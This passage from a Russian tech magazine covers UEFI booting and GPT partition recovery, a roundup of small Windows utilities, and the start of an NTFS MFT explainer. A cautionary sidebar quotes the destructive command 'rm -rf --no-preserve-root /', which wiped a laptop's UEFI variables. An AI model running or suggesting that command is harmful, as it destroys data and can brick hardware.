ле инициализации железа управление передается менеджеру загрузки. Он
определяет, что загружать далее.


             INFO

                            PI использует собствен ные бинари формата Terse
                          Executable.  Этот  тип  исполняемых  файлов
                        в целом очень похож на PE (может быть и COFF),
                      но сигнатура MZ была заменена на VZ. Погова‐
                      ривают, что совпадение с инициалами Винсента
                   Циммера,   труженика   Intel  и  руководителя
                      рабочей группы PI, абсолютно случайно.



Загрузка модулей EFI и загрузчика ОС
Менеджер загрузки определяет, какие драйверы и приложения UEFI дол жны
обязательно быть загружены на конкрет ной системе, и при необходимости
взаимодействует с поль зователем. В качестве одно го из таких приложений
загружается и загрузчик UEFI (UEFI OS loader), но на этом этапе можно заг‐
рузить и оболочку UEFI. Вооб ще, загрузчик ОС может быть как собс твенным
загрузчиком UEFI, так и любым дру гим, главное, чтобы он был нужного UEFI
формата с расширением .efi. Для среды UEFI это в любом случае просто
приложение, которое для работы с оборудованием дол жно использовать
только сервисы и протоколы UEFI.


Завершение загрузоч ных сервисов
При успешной загрузке ОС выполняется функция, завершающая все заг‐
рузочные сервисы и освобождающая выделенную им память. Управление
передается опе рационной системе.
   Концептуально загрузка с UEFI вроде не так сильно отличается от BIOS —
здесь тоже есть нечто похожее на POST и на началь ный загрузчик. Но появи‐
лась еще такая фича, как Fast Boot. Она связана с тем, что зачас тую действия
для инициализации железа операционная сис тема все равно выполняет
заново (скажем, запол няет таб лицу прерыва ний). Чтобы не делать двойную
работу, в UEFI данный этап может пропускаться, тем самым загрузка сис темы
ускоряется.
  Еще одна особен ность UEFI называется Secure Boot (забавно, что в поис‐
ковиках первым среди предложений по этому зап росу появляется «как отклю‐
чить»). Это протокол, предназначенный для подписи драйверов и проверки
исполняемых файлов. В первую очередь он предот вращает загрузку недове‐
ренных образов UEFI, проверяя подписи этих образов перед запус ком.
  Предполагается, что Secure Boot защищает в слу чае модификации обра‐
зов вредоносным ПО и не дает запус кать ся буткитам. На деле же Secure Boot
можно обойти с помощью раз личных ба гов реализации или вообще отклю‐
чить, чтобы избежать проблем с загрузкой аль тернативных ОС, а живой
работоспособный руткит для UEFI был об наружен в 2018 году. Ну и по стан‐
дарту функция Secure Boot вообще необязательна для реализации произво‐
дителями.
  Тем не менее, чтобы при включенной Secure Boot загружать что бы то
ни было на устрой ствах с уста новленными ключами Microsoft, эти бинарники
должны быть соответствующим обра зом подписаны. Подписывать GRUB чре‐
вато задержками релизов, да и Microsoft не осо бо горит желанием выдавать
ключ из‐за используемой им GPLv3.
   Это стало причиной появления так называемых предзагрузчиков: Shim
и PreLoader  (Loader.c), которые сами подписаны, но запускать могут уже
не подписанные MS образы. Что они и дела ют, передавая управле ние
GRUB’у или другому загрузчику. Нынче Shim используется такими дистри‐
бутивами, как Fedora, Debian, Ubuntu, SUSE. Более подробно с анализом
защищенности прошив ки в ходе загрузки ты можешь ознакомиться в нашей
статье про пентест UEFI.


ЕСЛИ КАЖЕТСЯ, ЧТО ВСЕ ПОТРАЧЕНО...
От ошибок никто не зас тра хован, и пот рачено все может быть по разным при‐
чинам. Юзер «что‐то нажал», возникли баги в дис ковых утилитах, а еще есть
особенности работы GPT с RAID. Да и UEFI, бесспорно, сложнее BIOS, а чем
объемнее код, тем легче ошибкам в него закрасться. Вот в разных реали‐
зациях и обнаруживаются баги, поз воляющие обойти защитные механизмы
UEFI потехи ради или для уста новки вредоно са в такую область, что не спасет
ни переустановка оси, ни смена диска. А мало ли, на что способны такие вре‐
доносы...
   Кстати, некоторые антивирусы уже умеют ска нировать UEFI на наличие
буткитов.


             INFO

                     К слову, не могу не упомянуть забавный случай,
                          когда пресловутый rm ‐rf ‐‐no‐preserve‐
                   root  / вместе с содержимым дисков  стер
                      содержимое переменных в NVRAM, которое в Lin‐
                        ux мон тируется в /sys/firmware/efi/efi‐
                   vars, что привело к окирпичиванию ноута. Такая
                        вот особенность реализации стан дарта попалась
                       экспериментатору и наглядно показа ла, что дос‐
                         туп на запись к переменным UEFI из ОС был сом‐
                        нительной   затеей.  В  общем,  хорошенько
                       подумай, если вдруг захочешь поиграть с огнем.


Так можно ли что‐то сделать, если на тво ем устройстве работает диск уже
в новом формате, а с ним случилась беда? В теории какие‐то проблемы мож‐
но решить с помощью UEFI Shell. Некоторые ошиб ки дисков, возникающие
при загрузке, UEFI исправляет самостоятельно; дру гие же, как, например,
во врезке, требуют «оперативного вмешательства».


Про верка целостности таб лиц и исправление ошибок
при загрузке
Стандартом неспроста предусмотрены две таб лицы GPT — первичная
и запасная. Кроме того что про веря ется сигнатура GPT и то, указывает ли
MyLBA на проверяемую таблицу, сверяются зна чения CRC32. Если при заг‐
рузке контрольная сумма одной из таблиц GPT не совпадает с действитель‐
ностью, то она восстанавлива ется из вто рой таб лицы. Если же слу чилось так,
что не совпали контрольные суммы для обеих таблиц, то устройство опре‐
деляется как не име ющее GPT‐разметки. Тут могут пригодиться инс трументы
поинтереснее.


Восстановление GPT-раз делов
Если пострадало больше одной служебной таб лицы, потребуются, очевидно,
другие решения, чем сверка контрольных сумм. Благо они существуют уже
не только для носите лей с раз меткой MBR. При случайном (или нет) пов‐
реждении GPT‐разделов есть воз можность их восстановить.
  В Linux, несмотря на то, как сообщество встретило UEFI, появились прог‐
раммы для работы с GPT, в том числе способ ные вос станавливать удаленные
файлы и разделы. Первая, на которую стоит обратить внимание, — testdisk.
Впрочем, у нее есть версии и под DOS, и под винду, и под «Мак». Она может
оказаться полезной для вос ста новления не только служебных таблиц, но и
удаленных данных. Скажем, у нас повреждена запасная таблица раз делов,
а первичная вооб ще куда‐то подева лась (ну вся кое ведь бывает, там if с of
перепутал в dd), и в ито ге в /dev/ отоб ражается пострадавшее устройство,
но не разделы на нем. Кому верить, как читать данные?
  Для восстановления разделов в testdisk необ ходимо выб рать устрой ство
и тип разделов. Программа пытается определить его самостоятельно, но в
нашем случае, когда не совпадают CRC обеих таблиц, она считает, что это не
GPT; впрочем, переубедить ее несложно. Далее выполняем анализ диска
в поисках потраченных раз делов и записываем информацию о найденном
разделе на диск. По ходу дела testdisk не ску пит ся на пояснения, что поз воля‐
ет в простых случаях пользовать ся утилитой, совершенно не заглядывая
в документацию!





  Обнаруженный testdisk’ом раз дел. Начина ется с блока 34, так как это
  минимум, выделяемый под структуры GPT

Вторая прога, которая в нашем случае может помочь, называется gdisk
по аналогии с fdisk, который не понимает GPT. Для восстановления разделов
она может использоваться в связке с parted: первая создает заново заголов‐
ки таблицы GPT, а вторая находит утраченные раз делы.





  Заботливый и информативный gparted, при помощи которого мы оста‐
  лись с пустой таблицей разделов

В таком случае в gdisk (или аналогичной утилите) можно создать новые
заголовки GPT взамен испорченных. Файлы и структуры файловых систем,
к счастью, остаются при таких манипуляциях на мес те, и необходимо лишь
восстановить таблицу разделов. Для этого желательно помнить примерные
границы разделов, так как их нужно сооб щить программе parted в команде
rescue. После перезагрузки пробуем примонтировать диск — и нам повезло,
магия сработала! Вот бы почаще так.





             Поиск и вос становление разделов в parted





  Монтируем восстановленный раз дел после перезагрузки. Все на месте!

Пользователи винды тоже не оста лись в стороне от технологичес кого прог‐
ресса. Прежде всего, им на помощь может прийти широко известная в узких
кругах утилита DMDE, последние версии которой даже могут похвастаться
полноценным графическим интерфейсом.





               Утилита DMDE с гра фичес ким интерфейсом

Есть, к слову, пол ноценная версия этой программы и для macOS. DMDE объ‐
единяет в себе функции дискового редактора и менеджера разделов. Утилита
умеет реконструировать структуру файлов и папок даже в слу чае сложных
повреждений, но самое главное — она может работать с разделами GUID
(GPT), причем варианты восста новления предлага ются в автоматическом
режиме.
   Если на машине под управлением Windows с UEFI/GPT полетел загрузчик,
восстановить его можно стандартным инстру ментарием операционной сис‐
темы. Достаточно загрузить машину с дистрибутивного образа Windows,
открыть командную строку сочета нием клавиш Shift + F10, а затем с исполь‐
зованием нескольких команд создать заново утраченный раздел EFI и помес‐
тить туда загрузчик. Подробные инс трукции можно отыскать в этих ваших
интернетах.
  Для счастливых владельцев компов производс тва Apple была разработана
специальная программа Remo Recover, ска чать которую можно с сай та раз‐
работчика. Там же представлены подробные инс трукции по ее исполь‐
зованию, хотя они, в принципе, не особен но нуж ны: программа (как и многие
другие приложения под Mac) обладает простым и инту итивно понятным гра‐
фическим интерфейсом.





                    Утилита Remo Recover для macOS


ПОДВЕДЕМ ИТОГИ
Основное назначение UEFI, как и БИОСа, заключается в загрузке ОС,
но архитектура UEFI вклю чает в себя намного больше модулей, чем необ‐
ходимо для этого. А чем система сложнее, тем ее легче поломать, что
доказывают  найденные  в  раз ных  реализациях ошибки  и  уяз вимос ти.
И казалось бы, если разницы нет, зачем платить больше?..
  Однако почему‐то в AMI,  Insyde, Phoenix пишут именно UEFI BIOS,
а используют этот стандарт такие производители, как Apple, Dell, HP, IBM,
Lenovo; причем в Apple он в ходу еще c 2006 года. Microsoft тоже подклю‐
чилась к этому проекту и внесла свой небезыз вестный вклад в виде Secure
Boot. В Linux сквозь боль и ненависть медленно, но верно раз рабатывались
программы для поддержки UEFI, в частнос ти Secure Boot и GPT, позволяющие
в настоящее вре мя на довольно низком уровне со всем этим работать и даже
решать некоторые проб лемы. Так что, по крайней мере, жить можно.


        WWW

                      •Блог Винсента Циммера, руководителя рабочей
                          группы PI
                      •Блог Мэттью Гарретта, разработчика ядра Lin‐
                              ux, получившего премию FSF за достижения
                         в области обеспечения загрузки Linux на сис‐
                         темах с UEFI Secure Boot
                      •Сайт Родерика Смита, авто ра пакета GPT fdisk
                         (содержит gdisk, sgdisk и cgdisk) и заг рузчика
                             rEFInd, где можно найти много инфы, связан‐
                        ной с UEFI
                  •Собственно  спецификации  UEFI,  сопутству‐
                    ющие документы и инструменты
                  •Также можешь поискать книгу Beyond BIOS. De‐
                            veloping with the Uniﬁed Extensible Firmware In‐
                             terface авторов  V. Zimmer, M. Rothman и S.
                              Marisetty, принимавших участие в разработке
                         UEFI
ТРЮКИ
   ЛЕГКИЙ
    СОФТ

       СОБИРАЕМ КОЛЛЕКЦИЮ
       КОМПАКТНЫХ ПРОГРАММ
           ДЛЯ WINDOWS





Каждого, кто име ет хоть какое‐то отно‐
шение к  IT, время от времени посеща ет
мысль сделать подборку из кро шечного
и полез ного соф та. Во‐первых, это просто
прикольно. Во‐вторых,  такие программы       Денис Колисниченко                                                                                 Постоянный автор журнала
можно водрузить на планшет с Windows,           dhsilabs@gmail.com«Хакер»
где   свободное   пространство   всегда
в дефиците.


Кроме того, можно поместить соз данную тобой подборку на какой‐то компак‐
тный носитель, например карту miniSD, — вдруг пригодится? Как правило,
небольшие программы потребляют мало ресурсов и отлично работают
на древних или слабых компах. Ты дума ешь, что юзеры во всем мире идут
в ногу со вре менем и старые компы уже давно доживают свой век на помой‐
ке? Могу тебя огорчить: есть много организаций, где до сих пор используют‐
ся «динозавры» с Windows XP, есть те же планшеты с виндой, где большую
часть встроенной памяти занимает сама вин да, а практичес ки весь софт при‐
ходится держать на SD‐карточке, из‐за чего силь но страдает быстродей‐
ствие.
  Сегодня мы попытаемся создать такую подборку, включающую браузер,
мессенджер, текстовый редактор и пару‐трой ку утилит вроде смотрелки кар‐
тинок или качалки файлов. Нас интересу ют толь ко самые маленькие утилиты,
до 10 Мбайт, — чем мень ше, тем лучше (но для некоторых будет сделано
исключение). Конечно, существуют и portable‐версии всем известных при‐
ложений, занимающие по нес колько сотен мегабай тов. Такие «портативные»
версии на старых компах могут и вовсе не запус тить ся, причем сразу по нес‐
кольким причинам — нет необ ходимых биб лиотек (вроде последних версий
.Net) или банально не хва тает ресурсов. Так что их мы рас сматривать
не будем.
   Весь описанный софт мы про верим на работоспособность на компе
с Windows XP, а также попытаемся запус тить его на десятке.


БРАУЗЕР
Начнем с браузера — самого важного компонента нашей подборки. Ведь
с его помощью можно найти в Сети дру гие программы, прочитать почту
или журнал «Хакер». Когда думаешь о portable‐бра узе ре, то первым делом
приходит на ум Tor Browser, работающий без уста новки и к тому же поз воля‐
ющий защититься от любопытных глаз. Но последняя его версия занимает
в распакованном виде аж 194 Мбайт! Это очень много для нашей подборки,
и мы исклю чаем его из списка кандидатов на попадание в список компактно‐
го софта.


             INFO

                    Компактных браузеров на нашей планете не так
                      уж и много. Большинство из них осно вано или на
                             Mozilla, или на Chromium,  что подразумевает
                       довольно  внушительный  размер.  Tor  Browser
                        (работает на базе  Firefox), повторимся, после
                       распаковки занял 194 Мбайт, SlimBrowser (осно‐
                       ван на Chromium) — 176 Мбайт.


Один из самых компактных бра узеров называется NetSurf. Его инстал лятор
весит всего 6 Мбайт, а пос ле установки бра узер занимает 15,3 Мбайт на дис‐
ке. Официальной portable‐версии нет, но ты можешь установить его на любой
комп, а потом просто скопировать папку с программой на флешку, и он будет
работать (проверил, пока писал статью).
  Преимущества NetSurf — мало весит и быс тро работает. Недос татки:
 • Кириллица в заголовке браузера и в адресной строке отображается
   некорректно, но проб лем с рус скими буквами на самих страницах нет, все
   выглядит читабельно.
 • В Windows 10 браузер нес колько раз падал во время серфинга, в Windows
  XP на тех же страницах работа ет ста бильно.
 • Не все страницы отоб ражаются правильно.





                    Так NetSurf выглядит в Windows XP





           А вот так тот же бра узер смотрится в Windows 10

Думаешь, 15 Мбайт — это предел? Нет, это полный беспре дел! Потому что
браузер D+ занимает всего 1,27 Мбайт. Для прос мотра несложных страниц
его возможностей будет вполне достаточно. Вот только в XP он испы тывает
трудности с кодировкой UTF‐8: почему‐то отоб ражает не все символы, хотя
в семерке и десятке с этим проб лем нет. Пусть браузер и не идеальный,
но 1,27 Мбайт в 2020 году — впечатляет.





                 Чудо‐браузер D+ объемом 1,27 Мбайт


ПОЧТОВЫЙ КЛИЕНТ
Без почты, как говорил небезызвес тный товарищ Печкин, в наше время
никуда. Самым «тяжелым» в нашей подборке будет всем известный почтовый
клиент Sylpheed. Для него есть пор тативная версия, он бес платный, но,
к сожалению, не поддерживает Windows XP. Нужна как минимум семерка.





                     Почтовый клиент Sylpheed

Архив по размеру вписывается в наше ограничение — 10 Мбайт, а вот рас‐
пакованная версия занима ет 28 Мбайт. Но зато распространяется эта прог‐
рамма бесплатно.
  Почтовый клиент Becky обладает привычным интерфейсом, похожим
на бестселлер своего времени The Bat! Работает без установки и занимает
всего 10 Мбайт после распаковки архива (сам архив име ет объем чуть
менее 5 Мбайт). Приложение нормально работа ет как в Windows XP, так и в
Windows 10. Более того, в пос ледней оно даже предложило на выбор два
интерфейса — классический и с поддержкой тачс крина.





                Компактный почтовый клиент Becky

Becky — отличный поч товый клиент. При работе с ним не было никаких багов
или сбоев. Он без проблем подключился к Google‐аккаунту (нужно только
разрешить использование небезопас ных при ложений), отобразил все соз‐
данные папки, справился с отправкой писем. Пол ноценный клиент, занима‐
ющий всего 10 Мбайт. Заманчиво. Есть только одна ложка дегтя — он share‐
ware. Здесь придется или платить, или искать другой вариант.





                     Так Becky работает в Windows 10

Почтовый клиент Koma‐Mail занимает всего 6,5 Мбайт на диске после рас‐
паковки, но к Google‐аккаунту он под ключиться так и не смог. Однако он
наверняка сгодится для других почтовых служб: в моем случае он нормально
работал с несколькими почтовыми серверами. Нужно экспериментировать:
если почтовик объявил забас товку, можно попробовать другую программу.
Но о таком компактном клиенте нельзя было не рас сказать.





    Koma‐Mail — компактный почтовый клиент, который не любит Google

Конечно, это далеко не все существующие в природе портативные почтовые
клиенты. Например, есть еще Qm — почтовик, который умеет только отправ‐
лять сообщения. На практике он может понадобить ся, если нужно быс тро
выслать файл или текстовое сообщение, не запус кая почтовую программу.
Пусть широкими возможнос тями он не блещет, зато занимает всего 20 Кбайт
(в архиве, 44 Кбайт после рас паковки).





       Программа Qm, которая умеет только отправлять сообщения

Впрочем, на просторах Сети можно найти консольный Bmail — программу
для отправ ки сообщений вовсе без графического интерфейса, которая весит
еще меньше — всего 17 Кбайт в архиве и 40 Кбайт после распаковки. Нас‐
тоящая находка для любителей сценариев командной оболочки.


КАЧАЛКА
Качал ка — это не толь ко душная комната с тренажерами, где мускулистые
юноши и упругие девушки упорно работают над своей фигурой. Это еще
и  несколько  мегабайтов  полезного  софта,  позволяющего  загрузить
какой‐нибудь тор рент.
  В качестве такового можно использовать PicoTorrent. Для XP и 32‐битной
версии семерки не забудь выб рать соответству ющую версию (x86). Инстал‐
лятор занимает 11 Мбайт, пос ле уста новки программа весит 27 Мбайт. В XP
установить программу у меня не получилось, а вот в семерке и десятке она
работает нормально.





              Компактная качалка тор рентов PicoTorrent

Нужно заметить, что «стандартный» клиент uTorrent занимает после установки
всего 16 Мбайт. Зато PicoTorrent не отоб ражает рекламу, впрочем, если
без рекламы тебе скучно и одиноко, можно ска чать портативную версию uTor‐
rent. А занимает такая версия после рас паковки все го 5 Мбайт. При этом
программа нормально работает как в XP, так и в Windows 10.
  В Linux есть очень полез ная утилита wget. В Windows в качестве подоб ного
инструмента можно использовать WackGet. Инсталлятор программы занима‐
ет меньше мегабайта. А после уста новки объем утилиты составит чуть более
двух. Все бы хорошо, но прог рамма не загружает файлы по протоколу HTTPS,
а благодаря стараниям Google сейчас практически все сайты перешли
на этот протокол. Не знаю, нас колько умес тным будет использование такого
инструмента в 2020 году, но, может, кому‐то при годится.





             WackGet хорош всем, жаль, не умеет в HTTPS

А вот портативная версия FlashGet отлично спра вилась с загрузкой фай ла
через HTTPS, поэто му имеет право на жизнь. Раз мер portable‐версии —
2,2 Мбайт.





                  Но олени FlashGet — лучше!


МУЛЬТИМЕДИАПРОГРАММЫ
Лучшим вариантом видеоплеера я бы наз вал MPC‐HC. Правда, по размеру
он несколько выбивается за установленные нами рамки, но нам нужно
не только запускать плеер, а еще и смотреть на нем фильмы, не так ли?
Кодеки, к сожалению, вносят свою леп ту в объем проигры вате ля. На офи‐
циальной странице загрузок можно скачать как инсталлятор, так и архив
с программой. Доступны версии для 32‐ и 64‐раз рядных систем. Приложение
поддерживает как XP, так и самую новую версию Windows.





               MPC‐HC: смотрим фильм в Windows XP

Small Player — бесплат ный и очень компактный му зыкальный проигры‐
ватель, чем‐то напоминающий Winamp. Архив с проигрывателем весит все‐
го 277 Кбайт, а после распаковки приложение займет 615 Кбайт. Вот это дей‐
ствительно компактное приложение. Таких показателей удалось достичь бла‐
годаря тому, что плеер написан на ассемблере. Поддерживаются операци‐
онные системы от XP до 10, но только 64‐разрядные.





                      Small Player действительно Small


ГРАФИЧЕСКИЕ РЕДАКТОРЫ И СМОТРЕЛКИ КАРТИНОК
PhotoFiltre — простой, бесплат ный и небольшой графический редактор.
На официальной  странице  дос тупна  portable‐версия,  которая  занима‐
ет 8 Мбайт после распаковки. Довольно удоб ный редактор и требует гораздо
меньше места, чем тот же GIMP. Приложение нормально работает в Windows
XP, 7 и 10.





              Так выглядит графичес кий редактор PhotoFiltre

IrfanView — компактная смот релка с базовыми возможностями редактирова‐
ния: тут есть кроп, поворот картинки и мно гое дру гое, что уме ют его более
«тяжелые» собратья. Инсталлятор занимает всего 2,5 Мбайт, а вот после рас‐
паковки программа весит уже 4,5 Мбайт. Отличный показатель для смот‐
релки. Функциональность легко рас ширить с помощью плагинов. Полное
собрание плагинов занимает 17 Мбайт в архиве, что, в общем‐то, тоже
не много.





                     Приложение IrfanView


             INFO

                        Есть еще одна неплохая смот релка, также обла‐
                    дающая задат ками графического редактора: Xn‐
                        View MP. Но она значительно больше — только
                       архив программы занимает 56 Мбайт. Для нашей
                      сборки это много.


EZView — ультракомпактная смотрелка картинок. Архив вмес те с исходными
кодами может похвастать ся весом всего в 127 Кбайт, а после распаковки
программа займет 156 Кбайт (если удалить исходники). Для работы прог‐
раммы нужен VC 2017 MFC DLL.





                        Программа EZView

Не забываем и о векторной гра фике. EVE (не путать с EVE Online) — очень
компактный (180 Кбайт) векторный редактор. Да, это не Corel, но и занимает
он на диске сов сем немного. Поддержи вает только собственный формат
файла. Работает как в XP, так и в Win10.





                      Векторный редактор EVE




                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ
       ЛЕГКИЙ СОФТ
             СОБИРАЕМ КОЛЛЕКЦИЮ КОМПАКТНЫХ
                      ПРОГРАММ ДЛЯ WINDOWS





ТЕКСТОВЫЕ РЕДАКТОРЫ
Про AbiWord, наверное, слышал каждый. Это текстовый редактор с улуч‐
шенным форматированием и поддержкой формата DOCX, чем‐то напоми‐
нающий Microsoft Word двадцатилетней давности. Размер инстал лятора —
11 Мбайт, после установки занимает 28 Мбайт, работает в Windows XP,
в более поздних вер сиях ОС запускает ся, но гарантировать стабильность его
работы, увы, нельзя. К преимуществам AbiWord можно отнести автоматичес‐
кую проверку правописания, автоматическое сохранение, поддержку мно‐
жества самых разных тексто вых форматов, привычный интерфейс, а также
наличие плагинов, позволяющих расширить воз можнос ти. Недостатки —
довольно большой раз мер,  и,  как‐никак, про ект уже  закрыт,  поэтому
обновлений редактора не будет.





  Популярный текстовый редактор AbiWord с хорошо знакомым каждому
  интерфейсом

Jarte — другой компактный текстовый про цес сор с необычным интерфейсом.
Размер архива (да, есть portable‐версия) — 4,5 Мбайт, а после рас паковки он
занимает 10 Мбайт, что вписывается в огра ничения, установленные нами.





               Ин терес ный текстовый редактор Jarte

Приложение поддержи вает множес тво разных форматов (в том числе фор‐
маты MS Word), оно довольно компактное, имеет автосохранение. Но вот UI
на любителя, использовать его, особен но понача лу, будет очень непривычно.
В редакторе имеется подсветка синтаксиса, нумерация строк, перекодиро‐
вание различных кодиро вок и многое другое, так что в Jarte при желании
можно писать код.
  Все это есть в простейшем редакторе Notepad2, который пос ле распаков‐
ки занимает всего мегабайт. Я сам часто исполь зую это приложение, когда
нужно быстро подправить какой‐то файл с PHP‐кодом. Notepad2 установлен
у меня как редактор по умолчанию в Windows, а также вызывается по F4 в Total
Commander.





                     Тексто вый редактор Notepad2

Еще один редактор для кодера — HxD. Это Hex‐редак тор. Размер архива
с инсталлятором составля ет 856 Кбайт, а пос ле установки приложение зай‐
мет всего 2,3 Мбайт. Программа нормально работа ет в XP.





                          Hex‐редактор HxD

QJot — компак тный текстовый редактор, поз воляющий работать с фор‐
матами DOC и RTF. С новым DOCX он не спра вится, но и имеющихся функций
достаточно для программы, которая весит всего 612 Кбайт.





              Сверхкомпактный тексто вый редактор QJot

Qedit —  довольно  интерес ный и  лег кий  редактор  (141  Кбайт  архив
и 250 Кбайт после распаковки). Чем он интересен? Многим: это и поддержка
скриптового движка, позволяющего писать и запус кать сценарии в пол ностью
настраиваемых менюш ках, и рас ширя емая (посредством DLL) функци ональ‐
ность, и другие возможнос ти, которыми обладает эта простенькая на первый
взгляд софтина.





          Очень простой, но при этом мощный редактор Qedit

Один из самых компактных текстовых редакторов — Win32Pad: после рас‐
паковки он занимает всего 69 Кбайт (если удалить идущие в «комплекте» тек‐
стовые файлы). Неплохая замена стандартному блокноту, хотя возможностей,
если сравнивать с Notepad2, в нем малова то. На иллюстрации интерфейс
программы английский, но на официальном сайте можно скачать русифи‐
катор.





                       Редактор Win32Pad


МЕССЕНДЖЕРЫ
Чтобы не было скучно, для общения с друзь ями нужен мессенджер. На эту
роль подойдет  Miranda. Пусть эта программа и не самая компактная
(архив 3,5 Мбайт, после рас паковки — 11 Мбайт), но зато она поддерживает
протоколы Facebook, GG, ICQ, IRC, Jabber, MSN. Да, все эти протоколы сей‐
час не очень популярны (из вос требованных остался только Facebook), но при
желании ты всегда сможешь ска чать portable‐версию Viber. Однако она
«выбивается из бюджета», поскольку весит 72,3 Мбайт.





                                Miranda

При желании в интернете можно найти старые версии Miranda, которые
занимают еще меньше мес та.


        WWW

                   Обширная коллекция старых версий приложений
                       хранится на сайте oldversion.com.



ПОЛЕЗНЫЕ СИСТЕМНЫЕ УТИЛИТЫ
TCPView — программа, позволяющая прос матривать TCP/UDP‐соединения,
чтобы понять, что делается в твоей сис теме. Она отображает наз вание про‐
цесса, работающего с сетью, его PID, название протокола, локальный адрес,
порт, удаленный адрес и порт, состояние соединения, счетчик пакетов,
количество отправленных байтов и другую полезную информацию. Must have
для системного админис тра тора.





                  Очень полезная ути лита TCPView

Еще одна must have утилита для сисадмина или любого продвинутого поль‐
зователя — Process Explorer. Да, это тебе не диспетчер задач. Тут все наг‐
лядно и понятно. Приложение поз воляет не толь ко просматривать список
процессов, но и завершать ненуж ные, а также «спиливать» целые деревья
процессов — щелкни правой кнопкой мыши на процессе и выбери команду
Kill Process или Kill Process Tree.
  Архив занимает 2 Мбайт, а в распакованном виде — 4 Мбайт (причем
в комплекте две версии: для 32‐ и 64‐бит ных сис тем).





            Альтер натива диспетчеру задач — Process Explorer

Утилита Process Monitor пришла на смену FileMon. Программа позволяет
узнать, какой процесс был открыт тем или иным файлом. Для работы при‐
ложения нужна ОС не ниже Vista, для XP придет ся поис кать старый добрый
FileMon. Также приложение дает воз можность прос мотреть используемые
приложением ресурсы — как объекты файловой системы, так и ключи реес‐
тра.





   Вот так легко вычислить PID процес са, открывшего определенный файл





                   Ин формация о про цес се

Это приложе ние толь ко предоставляет информа цию о процессе, а чтобы
убить его, нужно использовать тот же Process Explorer.
  CPU‐Z — еще одна полез ная утилита, демонс трирующая на экране сис‐
темную информацию. С ее помощью мож но получить сведения о процес‐
соре, графической под системе, быстродействии машины, а также многие
другие ценные данные об аппаратной конфигурации ПК.





                             Утилита CPU‐Z


ВМЕСТО ЗАКЛЮЧЕНИЯ
Итак, у нас получилась неплохая подборка. Остается только скачать рассмот‐
ренные приложе ния, что бы поместить их на флешку, — рано или поздно они
пригодятся каждому. Ну а напос ледок я сведу все описанные в статье прог‐
раммы в общую табличку — для удобства.
ТРЮКИ

   NTFS
  ИЗНУТРИ

            КАК УСТРОЕНА
       ФАЙЛОВАЯ ТАБЛИЦА MFT
            В WINDOWS





                                       Крис Касперски
                                           Известный российский
                                                  хакер. Легенда ][, ex‐
                                           редактор ВЗЛОМа. Также
                                           известен под псевдонимами
                                        мыщъх, nezumi (яп. 鼠,
                                         мышь), n2k, elraton, souriz,
                                                         tikus, muss, farah, jardon,
                                               KPNC.





Устройство файловой системы NTFS поражает своей гран‐
диозностью и напоминает огромный, окутанный мраком
лабиринт. Но  какого любите ля  приключений  остановит
паутина, скелеты и пара ловушек с ядовитыми стрелами?
Хватай факел, и отпра вимся в путь. Нашим первым квестом
будет изучение главной файловой таблицы — MFT и нес‐
кольких дочерних структур.


             INFO

                      Стандарт  файловой   системы   NTFS   вер‐
                      сии 3.1 появился в 2001 году с выходом на рынок
                     Windows XP и с тех пор не претерпел фундамен‐
                         тальных изменений. В Windows 10 также исполь‐
                         зуется NTFS  v3.1. Архитектуру и особенности
                         внутреннего устройства этой файловой системы
                      Крис Касперски под робно описал в своей книге
                       «Восстановление   дан ных»,   которая   сейчас
                         готовится к переизданию. Мы публикуем отрывок
                       из этой книги, где Крис рассказывает о том, что
                      представляет собой NTFS изнутри.



NTFS С ВЫСОТЫ ПТИЧЬЕГО ПОЛЕТА
Основным структурным элемен том всякой файловой системы является том
(volume), в случае с FAT совпадающий с раз делом (partition). NTFS под‐
держивает тома, состоящие из нес кольких разделов  (см.  рис.). Будем
для простоты считать, что том представляет собой отформатированный раз‐
дел (то есть раздел, содержащий служеб ные структуры файловой системы).





                Обычный и распределен ный тома

Большинство файловых систем трактуют том как совокупность файлов, сво‐
бодного дискового прос транс тва и служебных структур файловой системы,
но в NTFS все служебные структуры представлены файлами, которые (как
это и положено файлам) могут находиться в любом мес те тома, при необ‐
ходимости фрагментируя себя на несколько частей.
  Основным служебным файлом является главная файловая таблица, $MFT
(Master  File Table) — своеоб разная база данных, хранящая информацию
обо всех файлах тома: их именах, атрибутах, способе и порядке раз мещения
на диске. Каталог также является файлом осо бого типа, со списком принад‐
лежащих ему файлов и вло женных подкаталогов. Важно подчеркнуть, что
в MFT присутствуют все файлы, находящиеся во всех подкаталогах тома,
поэтому для восстановления диска наличия файла $MFT будет впол не дос‐
таточно.
  Остальные служебные файлы, называ емые ме тафайлами  (metaﬁles)
или ме тадан ными (metadata), всегда имеют имена, начинающиеся со знака
доллара ($), и носят сугубо вспомога тельный характер, интерес ный только
самой файловой системе. К ним в пер вую очередь относится: $LogFile —
файл транзакций, $Bitmap — карта свободного/занятого пространства,
$BadClust — перечень плохих кластеров. Текущие версии Windows блокиру‐
ют доступ к служебным файлам с прикладно го уровня (даже с правами адми‐
нистратора!), и всякая попытка открытия или создания такого файла в кор‐
невом каталоге обречена на неудачу.
   Классическое определение, данное в учеб никах информатики, отождест‐
вляет файл с именованной записью на диске. Большинс тво файловых сис тем
добавляет к этому понятие атрибута (attribute) — некоторой вспомогатель‐
ной характеристики, описывающей время создания, права дос тупа и так
далее. В NTFS имя файла, данные файла и его атрибуты пол ностью уравнены
в правах. Иначе говоря, вся кий файл NTFS представляет собой совокупность
атрибутов, каждый из которых хра нится как отдельный по ток байтов. Поэто‐
му, во избежание путаницы, атрибуты, хра нящие данные файла, час то
называют по токами (streams).
  Каждый атрибут состоит из те ла (body) и заголовка (header). Атрибуты
подразделяются на ре зиден тные (resident) и не резиден тные (non‐resi‐
dent). Резидентные атрибуты хра нятся непосредственно в $MFT, что сущес‐
твенно уменьшает грануляцию дискового пространс тва и сокращает время
доступа. Нерезидентные атрибуты хранят в $MFT лишь свой заголовок, опи‐
сывающий порядок размещения атрибута на дис ке.
   Назначение атрибута определяется его типом (type), пред ставляющим
собой четырехбайтное шес тнадцатеричное зна чение. При желании атрибуту
можно дать еще и имя (name), состоящее из символов, входящих в соответс‐
твующее пространство имен (namespace). Подавляющее большинство фай‐
лов имеет по меньшей мере три атрибута. К их числу относится стандартная
информация о файле (время создания, модификации, пос леднего доступа,
права доступа), которая хра нится в атри буте типа 10h, условно обознача‐
емом $STANDARD_INFORMATION. Ранние версии Windows NT позволяли обра‐
щаться к атрибутам по их условным обоз начениям, но начиная с Windows
2000 мы лишены этой возможности. Полное имя файла (не путать с путем!)
